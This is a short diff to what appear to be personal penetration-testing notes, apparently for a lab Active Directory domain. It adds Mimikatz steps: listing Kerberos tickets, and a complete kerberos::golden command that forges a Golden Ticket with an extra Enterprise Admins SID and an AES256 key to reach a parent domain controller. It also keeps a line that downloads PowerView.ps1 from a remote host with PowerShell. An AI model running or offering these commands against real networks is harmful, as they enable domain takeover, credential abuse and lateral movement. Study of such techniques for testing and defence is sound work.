@@ -1,3 +1,9 @@
+# Mimikatz
+	klist -> list all computer has ticket
+ 	dir \\dc01.warfare.corp\C$ -> Access is denied. -> need to create golden ticket show it will work
+
+  	kerberos::golden /user:Administrator /domain:child.warfare.corp /sid:S-1-5-21-3754860944-83624914-1883974761 /sids:S-1-5-21-3375883379-808943238-3239386119-519 /aes256:ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 /startoffset:-5 /endin:600 /renew:10080 /ptt
+
 # Download file
 	run in powershell -> iwr http://10.10.10.10:8000/PowerView.ps1 -OutFilew C:\Windows\Temp\PowerView.ps1
 
